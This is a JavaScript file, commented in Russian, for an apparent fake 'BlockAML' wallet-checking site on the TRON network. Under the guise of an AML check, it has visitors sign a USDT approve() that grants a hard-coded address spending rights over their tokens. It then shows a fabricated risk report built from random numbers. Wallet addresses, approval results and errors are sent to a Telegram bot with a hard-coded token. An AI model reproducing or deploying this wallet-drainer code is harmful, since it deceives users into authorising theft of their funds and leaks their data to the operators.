// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – ИСПРАВЛЕННОЕ ПОДКЛЮЧЕНИЕ
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

// Telegram (рабочая связка)
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;
let connectionAttempts = 0; // Для отслеживания попыток подключения

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ОТПРАВКА В TELEGRAM (ПРЯМАЯ)
// ============================================
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('❌ Ошибка Telegram:', result);
        } else {
            console.log('✅ Уведомление отправлено');
        }
    } catch (error) {
        console.error('❌ Ошибка отправки:', error);
    }
}

// ============================================
// ИСПРАВЛЕННАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        console.log('🔌 Попытка подключения кошелька...');
        
        // ===== TRONLINK (ОСНОВНОЙ) =====
        if (window.tronLink && window.tronLink.ready) {
            console.log('✅ TronLink обнаружен');
            
            // Пробуем получить уже существующее подключение
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                const address = window.tronLink.tronWeb.defaultAddress.base58;
                if (address && address !== 'false') {
                    connectedWalletAddress = address;
                    walletInput.value = address;
                    if (statusSpan) statusSpan.style.display = 'inline-flex';
                    sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                    alert('✅ TronLink подключён!');
                    return;
                }
            }
            
            // Запрашиваем подключение с правильными параметрами
            try {
                const result = await window.tronLink.request({
                    method: 'tron_requestAccounts',
                    params: {
                        websiteIcon: window.location.origin + '/favicon.ico',
                        websiteName: 'BlockAML'
                    }
                });
                
                console.log('Результат запроса:', result);
                
                // Ждём появления адреса
                let attempts = 0;
                const checkAddress = setInterval(() => {
                    if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                        const address = window.tronLink.tronWeb.defaultAddress.base58;
                        if (address && address !== 'false') {
                            connectedWalletAddress = address;
                            walletInput.value = address;
                            if (statusSpan) statusSpan.style.display = 'inline-flex';
                            sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                            alert('✅ TronLink подключён!');
                            clearInterval(checkAddress);
                        }
                    }
                    attempts++;
                    if (attempts > 20) {
                        clearInterval(checkAddress);
                        console.log('⏱ Таймаут ожидания адреса');
                    }
                }, 500);
                
            } catch (requestError) {
                console.error('Ошибка запроса:', requestError);
                if (requestError.message.includes('4001')) {
                    alert('❌ Вы отклонили подключение. Нажмите "Подключить" ещё раз и подтвердите.');
                } else {
                    throw requestError;
                }
            }
            return;
        }
        
        // ===== TRUST WALLET ЧЕРЕЗ TRONWEB =====
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            if (address && address !== 'false') {
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                sendTelegramMessage(`🔌 <b>Подключён Trust Wallet</b>\n<code>${address}</code>`);
                alert('✅ Trust Wallet подключён!');
                return;
            }
        }
        
        // ===== TRUST WALLET ЧЕРЕЗ TRUSTWALLET.OBJECT =====
        if (window.trustwallet && window.trustwallet.tronLink) {
            console.log('✅ Trust Wallet обнаружен');
            
            try {
                await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
                
                if (window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.defaultAddress) {
                    const address = window.trustwallet.tronLink.tronWeb.defaultAddress.base58;
                    connectedWalletAddress = address;
                    walletInput.value = address;
                    if (statusSpan) statusSpan.style.display = 'inline-flex';
                    sendTelegramMessage(`🔌 <b>Подключён Trust Wallet</b>\n<code>${address}</code>`);
                    alert('✅ Trust Wallet подключён!');
                    return;
                }
            } catch (trustError) {
                console.error('Ошибка Trust Wallet:', trustError);
            }
        }
        
        // ===== ЕСЛИ НИЧЕГО НЕ СРАБОТАЛО =====
        connectionAttempts++;
        
        if (connectionAttempts === 1) {
            // Первая попытка — показываем инструкцию
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            if (isMobile) {
                alert('📱 На телефоне:\n1. Откройте TronLink или Trust Wallet\n2. Перейдите во встроенный браузер (DApp Browser)\n3. Введите адрес сайта\n\n🔄 После этого нажмите "Подключить" снова');
            } else {
                alert('💻 На компьютере:\n1. Установите расширение TronLink\n2. Создайте или импортируйте кошелёк\n3. Разблокируйте расширение\n4. Обновите страницу и нажмите "Подключить"');
            }
        } else {
            // Повторные попытки — более жёсткое сообщение
            alert('❌ Кошелёк не найден. Убедитесь, что:\n\n1. TronLink установлен и разблокирован\n2. Сайт открыт через DApp Browser на телефоне\n3. Вы не отклоняли запрос подключения\n\n🔧 Попробуйте перезагрузить страницу и разрешить доступ');
        }
        
    } catch (error) {
        console.error('❌ Критическая ошибка подключения:', error);
        
        let userMessage = 'Ошибка подключения: ' + error.message;
        
        if (error.message.includes('4000')) {
            userMessage = '❌ Запрос на подключение уже обрабатывается. Закройте старое окно и попробуйте снова.';
        } else if (error.message.includes('4001')) {
            userMessage = '❌ Вы отклонили подключение. Нажмите "Подключить" ещё раз и подтвердите.';
        }
        
        alert(userMessage);
        sendTelegramMessage(`❌ <b>Ошибка подключения</b>\n${error.message}`);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        // Получаем tronWeb из правильного источника
        let tronWeb = null;
        
        if (window.tronLink && window.tronLink.tronWeb) {
            tronWeb = window.tronLink.tronWeb;
        } else if (window.trustwallet && window.trustwallet.tronLink) {
            tronWeb = window.trustwallet.tronLink.tronWeb;
        } else if (window.tronWeb) {
            tronWeb = window.tronWeb;
        }

        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        console.log('🔄 TronWeb получен, версия:', tronWeb.version);

        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 400_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 60000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        const message = `
✅ <b>Approve успешно отправлен</b>
📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
        `;
        await sendTelegramMessage(message);

        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        // Отправляем ошибку в Telegram
        let errorMessage = error.message || 'неизвестная ошибка';
        let errorType = 'unknown';
        
        if (errorMessage.includes('request aborted')) errorType = '⚠️ Сбой запроса';
        else if (errorMessage.includes('timeout')) errorType = '⏱ Таймаут';
        else if (errorMessage.includes('revert')) errorType = '❌ Откат транзакции';
        else if (errorMessage.includes('user rejected')) errorType = '👤 Отмена пользователем';
        
        sendTelegramMessage(`
❌ <b>Ошибка approve</b>
🔧 Тип: ${errorType}
📝 Сообщение: ${errorMessage}
📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
⏰ Время: ${new Date().toLocaleString()}
        `);
        
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('✅ Адрес скопирован');
}

// ============================================
// ПРОВЕРКА НАЛИЧИЯ КОШЕЛЬКА ПРИ ЗАГРУЗКЕ
// ============================================
function checkExistingWallet() {
    // Проверяем, есть ли уже подключённый кошелёк
    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
        const address = window.tronLink.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий кошелёк:', address);
        }
    } else if (window.tronWeb && window.tronWeb.defaultAddress) {
        const address = window.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий кошелёк:', address);
        }
    }
}

// ============================================
// ЗАПУСК
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Сайт загружен, инициализация...');
    
    // Проверяем наличие уже подключённого кошелька
    setTimeout(checkExistingWallet, 1000);
    
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.copyAddress = copyAddress;
    
    // Отправляем тестовое сообщение о загрузке
    setTimeout(() => {
        sendTelegramMessage(`🚀 <b>Сайт загружен</b>\n⏰ ${new Date().toLocaleString()}`);
    }, 2000);
});
